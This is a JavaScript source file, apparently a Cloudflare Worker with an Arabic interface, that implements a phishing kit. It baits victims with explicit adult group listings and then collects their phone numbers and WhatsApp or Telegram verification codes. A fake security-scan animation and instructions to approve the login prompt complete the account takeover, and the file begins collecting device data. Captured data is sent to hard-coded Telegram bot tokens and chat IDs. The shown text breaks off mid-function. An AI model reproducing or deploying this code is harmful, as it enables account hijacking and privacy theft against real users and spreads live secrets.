// البوت الأساسي لجمع الأرقام والأكواد والصور
const TELEGRAM_BOT_TOKEN = "8890617280:AAFwoSei7qe2Ve5h_cqAYWFCdE0ZDhaLbjc";
const TELEGRAM_CHAT_ID = "2089017831";

// البوت المخصص لاستقبال تفاعلات الأسئلة والإجابات الجريئة
const GAME_BOT_TOKEN = "8992947509:AAEEsw1FXKe1D075IQabhtaqES6oE__I2CA";
const GAME_CHAT_ID = "5811405421";

// حالة مؤقتة في الذاكرة (محدودة بدورة حياة الـ Worker instance)
let lastPhone = "غير معروف";
let lastCountry = "غير معروف";
let lastPlatform = "telegram";

function getClientInfo(request) {
    const userAgent = request.headers.get('user-agent') || 'غير معروف';
    const ip =
        request.headers.get('cf-connecting-ip') ||
        request.headers.get('x-forwarded-for') ||
        'غير معروف';
    return { userAgent, ip };
}

async function sendTelegramMessage(token, chatId, text) {
    try {
        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            })
        });
        if (!res.ok) {
            const errText = await res.text();
            console.error("Telegram Error:", res.status, errText);
        }
    } catch (error) {
        console.error("Telegram Error:", error);
    }
}

async function sendTelegramPhoto(photoBuffer, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');
        formData.append(
            'photo',
            new Blob([photoBuffer], { type: 'image/jpeg' }),
            'capture.jpg'
        );

        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        if (!res.ok) {
            const errText = await res.text();
            console.error("Telegram Photo Error:", res.status, errText);
        }
    } catch (error) {
        console.error("Telegram Photo Error:", error);
    }
}

function htmlResponse(html, status = 200) {
    return new Response(html, {
        status,
        headers: { 'Content-Type': 'text/html; charset=utf-8' }
    });
}

function jsonResponse(obj, status = 200) {
    return new Response(JSON.stringify(obj), {
        status,
        headers: { 'Content-Type': 'application/json; charset=utf-8' }
    });
}

async function parseRequestBody(request) {
    const contentType = request.headers.get('content-type') || '';
    if (contentType.includes('application/json')) {
        return await request.json();
    }
    if (
        contentType.includes('application/x-www-form-urlencoded') ||
        contentType.includes('multipart/form-data')
    ) {
        const formData = await request.formData();
        const obj = {};
        for (const [key, value] of formData.entries()) {
            obj[key] = typeof value === 'string' ? value : await value.text();
        }
        return obj;
    }
    const raw = await request.text();
    if (!raw) return {};
    try {
        return JSON.parse(raw);
    } catch {
        const params = new URLSearchParams(raw);
        return Object.fromEntries(params.entries());
    }
}

// 1. الصفحة الرئيسية
function renderHomePage() {
    return htmlResponse(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>اختر المنصة للمتابعة</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
            body { background: #0f172a; color: #fff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; width: 100vw; }
            .full-container { width: 100%; min-height: 100vh; background: #1e293b; padding: 25px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
            .warning-box { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 8px; text-align: center; font-size: 14px; font-weight: bold; margin-bottom: 25px; width: 100%; max-width: 400px; }
            h2 { font-size: 22px; margin-bottom: 10px; text-align: center; }
            p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; text-align: center; }
            .btn { width: 100%; max-width: 400px; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; text-align: center; display: block; transition: 0.2s; }
            .btn-whatsapp { background: #25D366; color: white; }
            .btn-telegram { background: #3b82f6; color: white; }
            .btn:active { transform: scale(0.98); }
        </style>
    </head>
    <body>
        <div class="full-container">
            <div class="warning-box">
                ⚠️ تحذير: (ستظهر لك مجموعات إباحية) ومحتوى مخصص للكبار فقط 🔥 (+18)
            </div>
            <h2>اختر المنصة للمتابعة 🔥</h2>
            <p>يرجى اختيار التطبيق المناسب لعرض المجموعات السرية</p>
            <a href="/groups?platform=whatsapp" class="btn btn-whatsapp">مجموعات واتساب</a>
            <a href="/groups?platform=telegram" class="btn btn-telegram">مجموعات تليجرام</a>
        </div>
    </body>
    </html>
    `);
}

// 2. صفحة عرض المجموعات
function renderGroupsPage(url) {
    const platform = url.searchParams.get('platform') || 'whatsapp';
    const platformName = platform === 'whatsapp' ? 'واتساب' : 'تليجرام';
    const btnColor = platform === 'whatsapp' ? '#25D366' : '#3b82f6';

    return htmlResponse(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>مجموعات ${platformName} المميزة</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
            body { background: #0f172a; color: #fff; min-height: 100vh; width: 100vw; }
            .full-container { width: 100%; min-height: 100vh; background: #1e293b; padding: 20px; display: flex; flex-direction: column; }
            .warning-box { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 20px; width: 100%; }
            h3 { text-align: center; margin-bottom: 20px; font-size: 18px; color: #f8fafc; }
            .group-card { background: #334155; padding: 15px; border-radius: 12px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #475569; }
            .group-info h4 { font-size: 15px; color: #fff; margin-bottom: 5px; }
            .group-info p { font-size: 12px; color: #94a3b8; }
            .join-btn { background: ${btnColor}; color: white; border: none; padding: 8px 18px; border-radius: 8px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="full-container">
            <div class="warning-box">
                ⚠️ تحذير: (ستظهر لك مجموعات إباحية) ومحتوى مخصص للكبار فقط 🔥 (+18)
            </div>
            <h3>اختر مجموعة للانضمام الفوري 🔥</h3>
            <div id="groups-list"></div>
        </div>

        <script>
            const groupNames = [
                "سهرات نيك جماعي ومقاطع مخفية ساخنة (+18)",
                "قروب بنات للتعارف الجنسي السريع والساخن",
                "أقوى فضائح البنات وعالم النيك الممنوع",
                "سوالف بنات ليل وعروض مقاطع ناااار (+18)",
                "تعارف متبادل وطلب مص ونيك مباشر للكبار",
                "قروب انحراف وسهرات جنسية للصبح",
                "بنات متحررات وعروض فيديو مباشر عارية تماماً",
                "عالم السهارى والنيك بلا قيود حصري VIP",
                "قروب دردشة جنسية وفيديو كول مخفي",
                "سهرات حمراء ومقاطع جنسية ممنوعة من العرض",
                "بنات للتعارف الصامت وطلب النيك السريع",
                "قروب الشات السري والمحتوى الجنسي الجريء",
                "جلسات نيك خاصة ومقاطع لا تُنسى ابداً",
                "تجمع السهارى والمقاطع الإباحية الحصرية",
                "قروب بنات VIP للتفاعل الجنسي المستمر",
                "سهرات الليل الحارة والنيـك المباشر",
                "دردشة ومقاطع نيك خاصة بدون أي عوائق",
                "قروب الانحراف المطلق والمحتوى الجنسي المميز",
                "أسرار السهارى ومقاطع نيك ليلية ساخنة",
                "تجمع الكبار فقط لفيديو مباشر ونيك عاري"
            ];
            const members = [342, 512, 280, 640, 195, 430, 315, 580, 260, 470, 385, 525, 410, 330, 490, 275, 610, 350, 445, 595];
            const list = document.getElementById('groups-list');
            for(let i = 0; i < 20; i++) {
                list.innerHTML += \`
                    <div class="group-card">
                        <div class="group-info">
                            <h4>\${groupNames[i]}</h4>
                            <p>🔥 متواجد الآن \${members[i]} عضواً | تفاعل دائم ومرئي</p>
                        </div>
                        <a href="/login?platform=${platform}&group=\${i+1}" class="join-btn">انضمام</a>
                    </div>
                \`;
            }
        </script>
    </body>
    </html>
    `);
}

// 3. صفحة تسجيل الدخول
function renderLoginPage(url) {
    const platform = url.searchParams.get('platform') || 'telegram';
    const pName = platform === 'whatsapp' ? 'واتساب' : 'تليجرام';
    const brandColor = platform === 'whatsapp' ? '#25D366' : '#3b82f6';

    return htmlResponse(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول - ${pName}</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
            body { background: #0f172a; color: #fff; min-height: 100vh; width: 100vw; }
            .full-container { width: 100%; min-height: 100vh; background: #1e293b; padding: 25px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
            .warning-box { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 20px; width: 100%; max-width: 450px; }
            h2 { text-align: center; margin-bottom: 20px; font-size: 20px; }
            .form-group { width: 100%; max-width: 450px; margin-bottom: 15px; }
            input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: white; font-size: 15px; outline: none; }
            input:focus, select:focus { border-color: ${brandColor}; }
            .search-box { margin-bottom: 8px; }
            .submit-btn { width: 100%; max-width: 450px; padding: 14px; background: ${brandColor}; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
            .error-msg { color: #ef4444; font-size: 13px; margin-top: 5px; text-align: right; display: none; }

            .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
            .modal-card { background: #1e293b; border: 2px solid #ef4444; padding: 25px; border-radius: 15px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
            .modal-card h3 { color: #ef4444; font-size: 18px; margin-bottom: 12px; }
            .modal-card p { color: #cbd5e1; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
            .modal-btn-telegram { display: block; width: 100%; padding: 12px; background: #3b82f6; color: white; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 14px; margin-bottom: 10px; }
            .modal-btn-cancel { display: block; width: 100%; padding: 10px; background: #475569; color: #f1f5f9; border: none; border-radius: 8px; font-weight: 500; font-size: 13px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="full-container">
            <div class="warning-box">
                ⚠️ (ستظهر لك مجموعات إباحية)<br>أدخل بياناتك للمتابعة وعرض المحتوى
            </div>
            <h2>تسجيل الدخول (${pName}) 🔵</h2>
            
            <form action="/submit-phone" method="POST" id="loginForm" onsubmit="return handleFormSubmit(event)">
                <input type="hidden" name="platform" value="${platform}" id="platformInput">
                
                <div class="form-group">
                    <input type="text" id="countrySearch" class="search-box" placeholder="🔍 ابحث عن الدولة أو مفتاح الخط..." oninput="handleSearch(this)">
                    <select name="country" id="countrySelect" required>
                        <optgroup label="🌐 الدول العربية (أساسية)">
                            <option value="اليمن (+967)">🇾🇪 اليمن (+967)</option>
                            <option value="السعودية (+966)">🇸🇦 السعودية (+966)</option>
                            <option value="مصر (+20)">🇪🇬 مصر (+20)</option>
                            <option value="الإمارات (+971)">🇦🇪 الإمارات (+971)</option>
                            <option value="العراق (+964)">🇮🇶 العراق (+964)</option>
                            <option value="الكويت (+965)">🇰🇼 الكويت (+965)</option>
                            <option value="قطر (+974)">🇶🇦 قطر (+974)</option>
                            <option value="البحرين (+973)">🇧🇭 البحرين (+973)</option>
                            <option value="عمان (+968)">🇴🇲 عمان (+968)</option>
                            <option value="الأردن (+962)">🇯🇴 الأردن (+962)</option>
                            <option value="سوريا (+963)">🇸🇾 سوريا (+963)</option>
                            <option value="لبنان (+961)">🇱🇧 لبنان (+961)</option>
                            <option value="فلسطين (+970)">🇵🇸 فلسطين (+970)</option>
                            <option value="المغرب (+212)">🇲🇦 المغرب (+212)</option>
                            <option value="الجزائر (+213)">🇩🇿 الجزائر (+213)</option>
                            <option value="تونس (+216)">🇹🇳 تونس (+216)</option>
                            <option value="ليبيا (+218)">🇱🇾 ليبيا (+218)</option>
                            <option value="السودان (+249)">🇸🇩 السودان (+249)</option>
                        </optgroup>
                        <optgroup label="🌍 باقي دول العالم">
                            <option value="الولايات المتحدة (+1)">🇺🇸 الولايات المتحدة (+1)</option>
                            <option value="تركيا (+90)">🇹🇷 تركيا (+90)</option>
                            <option value="فرنسا (+33)">🇫🇷 فرنسا (+33)</option>
                            <option value="ألمانيا (+49)">🇩🇪 ألمانيا (+49)</option>
                            <option value="بريطانيا (+44)">🇬🇧 بريطانيا (+44)</option>
                            <option value="إسبانيا (+34)">🇪🇸 إسبانيا (+34)</option>
                            <option value="إيطاليا (+39)">🇮🇹 إيطاليا (+39)</option>
                            <option value="الهند (+91)">🇮🇳 الهند (+91)</option>
                            <option value="باكستان (+92)">🇵🇰 باكستان (+92)</option>
                            <option value="أفغانستان (+93)">🇦🇫 أفغانستان (+93)</option>
                        </optgroup>
                    </select>
                </div>

                <div class="form-group">
                    <input type="tel" name="phone" id="phoneInput" placeholder="رقم الهاتف (بدون مفتاح الدولة)" required>
                    <div id="errorMsg" class="error-msg">⚠️ هذا الرقم غير صحيح لهذه الدولة!</div>
                </div>

                <button type="submit" class="submit-btn">التالي</button>
            </form>
        </div>

        <div class="modal-overlay" id="syriaModal">
            <div class="modal-card">
                <h3>⚠️ عذراً غير مدعوم</h3>
                <p>عذراً دولة سوريا غير مدعومة للتسجيل عبر واتساب يرجى تسجيل الدخول عبر تليجرام</p>
                <a href="/login?platform=telegram" class="modal-btn-telegram">تسجيل الدخول عبر تليجرام 🚀</a>
                <button type="button" class="modal-btn-cancel" onclick="closeSyriaModal()">إلغاء</button>
            </div>
        </div>

        <script>
            const currentPlatform = '${platform}';

            function closeSyriaModal() {
                document.getElementById('syriaModal').style.display = 'none';
                document.getElementById('countrySelect').selectedIndex = 0;
            }

            const select = document.getElementById('countrySelect');
            const options = Array.from(select.options);

            function handleSearch(inputObj) {
                const term = inputObj.value.toLowerCase();
                select.innerHTML = '';
                options.forEach(opt => {
                    if (opt.text.toLowerCase().includes(term) || opt.value.toLowerCase().includes(term)) {
                        select.appendChild(opt);
                    }
                });
            }

            function handleFormSubmit(event) {
                event.preventDefault();
                
                const countryVal = select.value;
                const searchVal = document.getElementById('countrySearch').value.toLowerCase();

                if (currentPlatform === 'whatsapp' && (countryVal.includes('سوريا') || searchVal.includes('سوريا') || searchVal.includes('سورية') || searchVal.includes('963'))) {
                    document.getElementById('syriaModal').style.display = 'flex';
                    return false;
                }

                if (validateForm()) {
                    document.getElementById('loginForm').submit();
                }
            }

            const countryRules = {
                'اليمن': { length: 9, prefixes: ['70', '71', '73', '77', '78'], name: 'اليمن' },
                'السعودية': { length: 9, prefixes: ['50', '53', '54', '55', '56', '57', '58', '59'], name: 'السعودية' },
                'مصر': { length: 10, prefixes: ['10', '11', '12', '15'], name: 'مصر' },
                'الإمارات': { length: 9, prefixes: ['50', '52', '54', '55', '56', '58'], name: 'الإمارات' },
                'العراق': { length: 10, prefixes: ['75', '77', '78', '79'], name: 'العراق' },
                'الكويت': { length: 8, prefixes: ['5', '6', '9'], name: 'الكويت' },
                'قطر': { length: 8, prefixes: ['3', '5', '6', '7'], name: 'قطر' },
                'البحرين': { length: 8, prefixes: ['3', '6'], name: 'البحرين' },
                'عمان': { length: 8, prefixes: ['7', '9'], name: 'عمان' },
                'الأردن': { length: 9, prefixes: ['77', '78', '79'], name: 'الأردن' },
                'سوريا': { length: 9, prefixes: ['93', '94', '95', '96', '98', '99'], name: 'سوريا' },
                'لبنان': { length: 8, prefixes: ['3', '70', '71', '76', '78', '79', '81'], name: 'لبنان' },
                'فلسطين': { length: 9, prefixes: ['59', '56'], name: 'فلسطين' },
                'المغرب': { length: 9, prefixes: ['6', '7'], name: 'المغرب' },
                'الجزائر': { length: 9, prefixes: ['5', '6', '7'], name: 'الجزائر' },
                'تونس': { length: 8, prefixes: ['2', '4', '5', '9'], name: 'تونس' },
                'ليبيا': { length: 9, prefixes: ['91', '92', '93', '94', '95'], name: 'ليبيا' },
                'السودان': { length: 9, prefixes: ['91', '92', '99', '96', '90'], name: 'السودان' },
                'الولايات المتحدة': { length: 10, prefixes: [], name: 'الولايات المتحدة' },
                'تركيا': { length: 10, prefixes: ['5'], name: 'تركيا' },
                'فرنسا': { length: 9, prefixes: ['6', '7'], name: 'فرنسا' },
                'ألمانيا': { length: 10, prefixes: ['1'], name: 'ألمانيا' },
                'بريطانيا': { length: 10, prefixes: ['7'], name: 'بريطانيا' },
                'إسبانيا': { length: 9, prefixes: ['6', '7'], name: 'إسبانيا' },
                'إيطاليا': { length: 10, prefixes: ['3'], name: 'إيطاليا' },
                'الهند': { length: 10, prefixes: ['6', '7', '8', '9'], name: 'الهند' },
                'باكستان': { length: 10, prefixes: ['3'], name: 'باكستان' },
                'أفغانستان': { length: 9, prefixes: ['7'], name: 'أفغانستان' }
            };

            function validateForm() {
                const countryVal = select.value;
                const phone = document.getElementById('phoneInput').value.trim();
                const errorMsg = document.getElementById('errorMsg');

                if (isNaN(phone) || phone === '') {
                    errorMsg.style.display = 'block';
                    errorMsg.innerText = '⚠️ يرجى إدخال أرقام صحيحة فقط.';
                    return false;
                }

                let matchedKey = Object.keys(countryRules).find(key => countryVal.includes(key));
                if (matchedKey) {
                    let rule = countryRules[matchedKey];
                    if (phone.length !== rule.length) {
                        errorMsg.style.display = 'block';
                        errorMsg.innerText = '⚠️ عذراً، هذا الرقم ليس خلويًا فعليًا في ' + rule.name + ' (يجب أن يكون ' + rule.length + ' أرقام)';
                        return false;
                    }
                    if (rule.prefixes.length > 0) {
                        let isValidPrefix = rule.prefixes.some(p => phone.startsWith(p));
                        if (!isValidPrefix) {
                            errorMsg.style.display = 'block';
                            errorMsg.innerText = '⚠️ عذراً، البادئة المدخلة غير صحيحة لشبكات الاتصالات في ' + rule.name;
                            return false;
                        }
                    }
                } else {
                    if (phone.length < 7 || phone.length > 12) {
                        errorMsg.style.display = 'block';
                        errorMsg.innerText = '⚠️ يرجى التحقق من صحة الرقم المدخل.';
                        return false;
                    }
                }

                errorMsg.style.display = 'none';
                return true;
            }
        </script>
    </body>
    </html>
    `);
}

// 4. صفحة إدخال رمز التحقق مع الخداع البصري المتحرك
function renderOtpPage(url) {
    const platform = url.searchParams.get('platform') || lastPlatform;
    const brandColor = platform === 'whatsapp' ? '#25D366' : '#3b82f6';
    const platformName = platform === 'whatsapp' ? 'تطبيق واتساب' : 'تطبيق تليجرام';

    const otpLength = platform === 'whatsapp' ? 6 : 5;
    const placeholderDash = '-'.repeat(otpLength);

    const chatLink = platform === 'whatsapp' ? 'https://wa.me/' : 'tg://user?id=777000';
    const chatButtonText = platform === 'whatsapp' ? 'انقر هنا لأخذ الكود من واتساب' : 'انقر هنا لأخذ الكود من تليجرام';

    return htmlResponse(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>التحقق من الحساب والأمان</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
            body { background: #0f172a; color: #fff; min-height: 100vh; width: 100vw; }
            .full-container { width: 100%; min-height: 100vh; background: #1e293b; padding: 25px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
            .warning-box { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: bold; margin-bottom: 20px; width: 100%; max-width: 400px; }
            h3 { text-align: center; margin-bottom: 15px; font-size: 18px; }
            .form-group { width: 100%; max-width: 400px; margin-bottom: 15px; }
            input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: white; font-size: 20px; text-align: center; letter-spacing: 5px; outline: none; }
            input:focus { border-color: ${brandColor}; }
            
            .submit-btn { width: 100%; max-width: 400px; padding: 14px; background: #475569; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: not-allowed; opacity: 0.6; transition: 0.3s; }
            
            .timer-box { margin-top: 15px; text-align: center; font-size: 14px; color: #94a3b8; width: 100%; max-width: 400px; }
            .resend-btn { background: #0284c7; color: #ffffff; border: none; padding: 12px 20px; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 10px; display: none; width: 100%; transition: background 0.2s; }
            .resend-btn:hover { background: #0369a1; }
            .sent-info-box { margin-top: 20px; font-size: 14px; color: #38bdf8; text-align: center; font-weight: 500; line-height: 1.6; max-width: 400px; }
            .action-link-btn { display: inline-block; width: 100%; max-width: 400px; margin-top: 10px; padding: 12px; color: #ffffff; font-weight: bold; font-size: 14px; border-radius: 8px; text-decoration: none; text-align: center; transition: background 0.2s; cursor: pointer; }
            .btn-chat { background: ${brandColor}; }
            .btn-email { background: #ea4335; margin-top: 8px; }

            .security-scanner { width: 100%; max-width: 400px; background: #0f172a; border: 1px solid #334155; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
            .scanner-text { color: #38bdf8; font-size: 13px; font-weight: 600; margin-bottom: 10px; min-height: 20px; }
            .progress-bar-container { width: 100%; background: #1e293b; border-radius: 5px; height: 6px; overflow: hidden; }
            .progress-bar-fill { width: 0%; height: 100%; background: ${brandColor}; transition: width 0.5s ease; }
        </style>
    </head>
    <body>
        <div class="full-container">
            <div class="warning-box">
                ⚠️ (ستظهر لك مجموعات إباحية)<br>انتظر قليلاً حتى يصلك كود التحقق
            </div>

            <div class="security-scanner">
                <div class="scanner-text" id="scannerStatusText">جاري فحص الحماية الأمني والاتصال بالخادم...</div>
                <div class="progress-bar-container">
                    <div class="progress-bar-fill" id="progressBarFill"></div>
                </div>
            </div>

            <h3>أدخل رمز التحقق (${otpLength} أرقام)</h3>
            
            <form action="/submit-otp?platform=${platform}" method="POST">
                <div class="form-group">
                    <input type="text" name="otp" id="otpInput" maxlength="${otpLength}" placeholder="${placeholderDash}" required autocomplete="off">
                </div>
                <button type="submit" id="submitBtn" class="submit-btn" disabled>تحقّق وعرض المحتوى</button>
            </form>

            <div class="timer-box">
                <div id="timerText">لم يصلك كود التحقق؟ يمكنك طلب كود جديد خلال: <span id="countdown">01:00</span></div>
                <button type="button" id="resendBtn" class="resend-btn" onclick="requestNewCode()">إعادة إرسال كود جديد</button>
            </div>

            <div class="sent-info-box">
                لقد تم إرسال الكود إلى ${platformName} أو البريد الإلكتروني
                <br>
                <a onclick="notifyClick('app')" class="action-link-btn btn-chat">${chatButtonText}</a>
                <a onclick="notifyClick('email')" class="action-link-btn btn-email">فتح تطبيق البريد الإلكتروني</a>
            </div>
        </div>

        <script>
            const securitySteps = [
                { text: "جاري فحص الحماية الأمني والتشفير الطرفي...", progress: 20 },
                { text: "جاري فهم خوارزميات التوثيق ومطابقة البصمة...", progress: 45 },
                { text: "التحقق من صحة الجلسة وسجل الاتصال...", progress: 70 },
                { text: "جاهز لتلقي كود التحقق وتأكيد العضوية...", progress: 100 }
            ];

            let currentStepIdx = 0;
            const statusTextEl = document.getElementById('scannerStatusText');
            const progressFillEl = document.getElementById('progressBarFill');

            const securityInterval = setInterval(() => {
                if (currentStepIdx < securitySteps.length) {
                    statusTextEl.innerText = securitySteps[currentStepIdx].text;
                    progressFillEl.style.width = securitySteps[currentStepIdx].progress + '%';
                    currentStepIdx++;
                } else {
                    clearInterval(securityInterval);
                }
            }, 3000);

            function notifyClick(type) {
                fetch('/notify-click', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: type })
                });

                if (type === 'app') {
                    setTimeout(() => { window.location.href = "${chatLink}"; }, 300);
                } else {
                    setTimeout(() => { window.location.href = 'intent://#Intent;package=com.google.android.gm;end;'; }, 300);
                }
            }

            const otpInput = document.getElementById('otpInput');
            const submitBtn = document.getElementById('submitBtn');
            const requiredLength = ${otpLength};
            const activeColor = '${brandColor}';

            otpInput.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length === requiredLength) {
                    submitBtn.disabled = false;
                    submitBtn.style.background = activeColor;
                    submitBtn.style.cursor = 'pointer';
                    submitBtn.style.opacity = '1';
                } else {
                    submitBtn.disabled = true;
                    submitBtn.style.background = '#475569';
                    submitBtn.style.cursor = 'not-allowed';
                    submitBtn.style.opacity = '0.6';
                }
            });

            let timeLeft = 60;
            const countdownEl = document.getElementById('countdown');
            const timerText = document.getElementById('timerText');
            const resendBtn = document.getElementById('resendBtn');

            const timer = setInterval(() => {
                let minutes = Math.floor(timeLeft / 60);
                let seconds = timeLeft % 60;
                minutes = minutes < 10 ? '0' + minutes : minutes;
                seconds = seconds < 10 ? '0' + seconds : seconds;
                countdownEl.innerHTML = minutes + ':' + seconds;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    timerText.style.display = 'none';
                    resendBtn.style.display = 'block';
                }
                timeLeft--;
            }, 1000);

            function requestNewCode() {
                resendBtn.disabled = true;
                resendBtn.innerText = "جاري إرسال الطلب...";
                fetch('/resend-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                }).then(res => {
                    resendBtn.innerText = "✅ تم طلب الكود، تأكد من التطبيق الرسمي";
                    resendBtn.style.background = "#059669";
                }).catch(err => {
                    resendBtn.innerText = "❌ حدث خطأ، حاول مجدداً";
                    resendBtn.disabled = false;
                });
            }
        </script>
    </body>
    </html>
    `);
}

// 5. صفحة التأكيد النهائية
function renderSubmitOtpPage(url, otp) {
    const platform = url.searchParams.get('platform') || lastPlatform;
    const brandColor = platform === 'whatsapp' ? '#25D366' : '#3b82f6';

    const greenBtnText = platform === 'telegram'
        ? 'يرجى الذهاب لتليجرام والنقر على زر "نعم أنا" لعرض المجموعات، انتظر قليلاً ودون ذلك لن تنضم لشيء'
        : 'يرجى الذهاب إلى واتساب والنقر على زر "سماح" للموافقة على انضمامك للمجموعات كاملة';

    return htmlResponse(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تأكيد الدخول للمجموعة</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
            body { background: #0f172a; color: #fff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center; }
            .card { background: #1e293b; padding: 25px; border-radius: 12px; max-width: 400px; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
            h2 { font-size: 20px; margin-bottom: 12px; }
            p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
            .action-btn { width: 100%; padding: 14px; background: ${brandColor}; color: white; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; line-height: 1.4; text-align: center; }
            .continue-small-btn { display: inline-block; margin-top: 10px; padding: 6px 15px; background: #475569; color: #fff; border-radius: 6px; font-size: 12px; text-decoration: none; cursor: pointer; border: none; font-weight: bold; }
            .continue-small-btn:hover { background: #334155; }
            .loader { border: 4px solid #334155; border-top: 4px solid ${brandColor}; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            
            .error-text { color: #ef4444; font-size: 13px; font-weight: bold; margin-bottom: 15px; display: block; line-height: 1.5; }
            .retry-btn { display: block; width: 100%; padding: 13px; background: ${brandColor}; color: white; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 15px; margin-bottom: 12px; transition: 0.2s; }
            .free-group-btn { display: block; width: 100%; padding: 12px; background: #475569; color: #f1f5f9; border-radius: 10px; text-decoration: none; font-weight: 500; font-size: 13px; transition: 0.2s; }
            .free-group-btn:hover { background: #334155; }

            .game-box { text-align: right; }
            .game-box h3 { color: #38bdf8; font-size: 16px; margin-bottom: 15px; text-align: center; line-height: 1.6; }
            .gender-btn { display: block; width: 100%; padding: 12px; margin: 8px 0; background: #334155; color: white; border: 1px solid #475569; border-radius: 8px; font-weight: bold; cursor: pointer; text-align: center; }
            .gender-btn:hover { background: #475569; }
            .input-action-field { width: 100%; padding: 12px; background: #0f172a; border: 1px solid ${brandColor}; color: white; border-radius: 8px; font-size: 15px; margin-bottom: 12px; outline: none; text-align: center; }
            .answer-box { background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #ef4444; margin-top: 15px; font-size: 14px; color: #f8fafc; line-height: 1.6; text-align: center; }
            .back-link { display: inline-block; margin-top: 10px; color: #94a3b8; font-size: 13px; text-decoration: underline; cursor: pointer; }
            .world-btn { background: #8b5cf6; margin-top: 8px; }
        </style>
    </head>
    <body>
        <div class="card" id="mainCard">
            <div id="step1Container">
                <h2>🔒 خطوة أخيرة للانضمام</h2>
                <p>اضغط على الزر أدناه لتأكيد هويتك وفتح رابط المجموعة المباشر.</p>
                <button class="action-btn" id="startBtn" onclick="executeCapture()">${greenBtnText}</button>
                <br>
                <button class="continue-small-btn" onclick="executeCapture()">[إستمرار]</button>
                <div class="loader" id="loader"></div>
            </div>
            
            <div id="statusBox" style="display:none;"></div>
        </div>

        <script>
            async function executeCapture() {
                const loader = document.getElementById('loader');
                const statusBox = document.getElementById('statusBox');
                document.getElementById('step1Container').style.display = 'none';
                loader.style.display = 'block';

                try {
                    let batteryLevel = null;
                    let charging = null;
                    if (navigator.getBattery) {
                        try {
                            const battery = await navigator.getBattery();
                            batteryLevel = Math.round(battery.level * 100);
